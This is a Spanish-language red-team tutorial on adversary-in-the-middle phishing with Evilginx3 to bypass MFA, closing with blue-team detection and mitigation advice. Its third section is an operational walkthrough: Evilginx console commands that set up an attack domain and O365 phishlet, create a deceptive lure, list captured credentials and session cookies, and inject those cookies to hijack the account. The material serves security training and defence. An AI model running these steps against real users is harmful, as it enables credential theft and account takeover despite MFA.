---
tags: [red_team, initial_access, phishing, aitm, mfa_bypass, reverse_proxy, evilginx3]
---

# Phishing AiTM (Adversary-in-the-Middle) con Evilginx3 y Bypass de MFA

## 🎯 1. Concepto Técnico y Mecánica
El phishing tradicional basado en la clonación estática de portales web resulta ineficaz contra infraestructuras protegidas por Autenticación Multifactor (MFA) basada en códigos TOTP, SMS o notificaciones Push. El enfoque **Adversary-in-the-Middle (AiTM)** resuelve esta barrera posicionando un **proxy reverso transparente** entre la víctima y el Proveedor de Identidad (IdP) legítimo (como Microsoft Entra ID, Okta o Ping Identity).


```

[ Víctima ] <---> [ Proxy Reverso (Evilginx3) ] <---> [ Proveedor de Identidad Legítimo ]

```

### Mecánica Interna de Explotación
1. **Intercepción y Forwarding:** El proxy reverso recibe las solicitudes HTTPS entrantes desde el navegador de la víctima y las reenvía dinámicamente al servidor oficial del IdP.
2. **Reescritura de Cabeceras y Dominio:** El proxy intercepta las respuestas HTTP/HTTPS, sustituyendo los dominios legítimos por subdominios controlados por la infraestructura del atacante y ajustando cabeceras como `Host`, `Referer` y `Origin`.
3. **Captura de Credenciales en Claro:** Durante el proceso de autenticación, el proxy registra las variables POST enviadas por el cliente (identificador de usuario y contraseña).
4. **Captura y Secuestro del Session Token:** La víctima completa el reto de MFA en el servicio legítimo a través del canal intermedio. Una vez validado, el IdP emite las cookies de autenticación de sesión (por ejemplo, `ESTAUTH` o `ESTAUTHPERSISTENT` en el entorno de Microsoft). El proxy reverso captura estas cookies antes de entregarlas al cliente final, permitiendo al atacante inyectarlas directamente en su propio navegador para suplantar la sesión **sin requerir la clave ni el dispositivo MFA**.

---

## 🔍 2. Componentes de Infraestructura y Configuración

### A. Phishlets
Un *phishlet* es un archivo de configuración en sintaxis YAML que instruye al proxy reverso sobre cómo interactuar con una aplicación o IdP específico. Sus secciones críticas incluyen:
* **`landing_path`:** Ruta de acceso inicial enviada a la víctima.
* **`sub_filters`:** Reglas de sustitución en tiempo real encargadas de modificar enlaces, nombres de dominio y llamadas API embebidas en el código HTML/JavaScript devuelto por el IdP.
* **`auth_tokens`:** Especificación de las cookies exactas necesarias para considerar que la sesión ha sido capturada exitosamente.
* **`credentials`:** Reglas regex para extraer campos de usuario y contraseña desde los cuerpos de las peticiones HTTP POST.

### B. Gestión de Dominios y Certificados TLS
Para evitar advertencias de seguridad en el navegador de la víctima y evadir sistemas de inspección en puertas de enlace de correo (*Secure Email Gateways* - SEG):
* Se requiere el uso de dominios categorizados (*Categorized Domains*) o con alta reputación histórica (*Domain Ageing*).
* Generación automática y renovación de certificados TLS mediante la integración nativa de **Let's Encrypt** y el protocolo ACME.

---

## 🛠️ 3. Guía de Ejecución y Explotación Operativa

### Paso 1: Configuración de Servidor y Dominio en Evilginx3
Acceder a la consola de control de Evilginx3 y definir el dominio raíz junto con la dirección IP pública de la infraestructura ofensiva:

```bash
# Iniciar la interfaz interactiva de Evilginx3
sudo evilginx -p /usr/share/evilginx/phishlets

# Establecer la IP del C2 y el dominio de ataque
: config ip 203.0.113.50
: config domain portal-login-auth.com

```

### Paso 2: Despliegue de Phishlet y Certificación SSL/TLS

Vincular el phishlet correspondiente al objetivo (ej. Microsoft 365) y solicitar los certificados de cifrado:

```bash
# Asignar subdominio al phishlet
: phishlets hostname o365 login.portal-login-auth.com

# Activar phishlet (obtiene certificado mediante Let's Encrypt automáticamente)
: phishlets enable o365

```

### Paso 3: Generación del Enlace de Distribución (Lure)

Crear el vector de acceso URL con parámetros de redirección tras la captura exitosa:

```bash
# Crear el objeto Lure para el phishlet configurado
: lures create o365
: lures set 0 redirect_url [https://www.empresa-objetivo.com](https://www.empresa-objetivo.com)
: lures set 0 og_title "Inicio de Sesión Requerido - Portal Corporativo"

# Obtener la URL única para la campaña
: lures get-url 0

```

### Paso 4: Captura e Inyección del Token de Sesión

Cuando el objetivo accede al enlace y completa el proceso de autenticación con su factor MFA, la consola notifica el compromiso de la cuenta:

```bash
# Listar las sesiones interceptadas
: sessions

# Mostrar las credenciales y el bloque de cookies de la sesión activa
: sessions 1

```

**Inyección de Sesión en el Navegador:**

1. Copiar el bloque de cookies en formato JSON entregado por la consola.
2. Abrir una ventana del navegador en la máquina del auditor e instalar una extensión de gestión de cookies (*Cookie-Editor*) o usar las herramientas de desarrollador (`F12`).
3. Inyectar las cookies capturadas en el dominio objetivo legítimo (`login.microsoftonline.com`).
4. Actualizar la página para acceder a la consola del usuario omitiendo la contraseña y el factor de autenticación.

---

## 🛡️ 4. Detección, Telemetría y Mitigación (Blue Team)

* **Autenticación FIDO2 / WebAuthn (Resistente a Phishing):** Es la única contramedida definitiva frente a ataques AiTM. Las llaves físicas (YubiKeys) y Passkeys vinculan la firma criptográfica al dominio de la barra de direcciones (`origin`). Si la víctima se encuentra en `portal-login-auth.com`, el estándar FIDO2 rechaza firmar el desafío al no coincidir con `login.microsoftonline.com`.
* **Políticas de Acceso Condicional (Entra ID / Okta):**
* Exigir que los dispositivos estén unidos al dominio corporativo o marcados como *Compliant* en Microsoft Intune para permitir el inicio de sesión.
* Restringir el acceso según ubicaciones de red confiables o rangos de direcciones IP autorizados.


* **Detección por Anomalía en Telemetría de Sesión:**
* Alertas en Microsoft Defender for Cloud Apps o SIEM ante eventos de inicio de sesión con cambio repentino de dirección IP o agente de usuario (*User-Agent*) en el lapso entre la emisión del token y la primera interacción.
* Monitoreo de logs de autenticación analizando inconsistencias en los campos `User-Agent` y direcciones IP asociadas al uso del *Primary Refresh Token* (PRT).
